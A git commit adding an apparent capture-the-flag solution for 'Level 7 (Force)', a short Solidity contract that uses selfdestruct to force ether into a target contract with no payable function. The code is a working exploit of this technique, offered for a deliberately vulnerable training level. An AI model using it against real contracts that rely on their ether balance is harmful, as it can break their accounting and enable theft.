b5982046cf3b4e78906f34d396a3db07815bedf0
0xEval <0xeval@pm.me>
2022-03-19 12:38:39 +0800

    Adding solutions to Level 7 (Force)

---
+++ src/levels/07-Force/ForceAttack.sol
@@ -0,0 +1,17 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.10;
+
+import "./Force.sol";
+
+contract ForceAttack {
+    Force force;
+
+    constructor(Force _force) {
+        force = _force;
+    }
+
+    function attack() public payable {
+        address payable sendTo = payable(address(force));
+        selfdestruct(sendTo);
+    }
+}
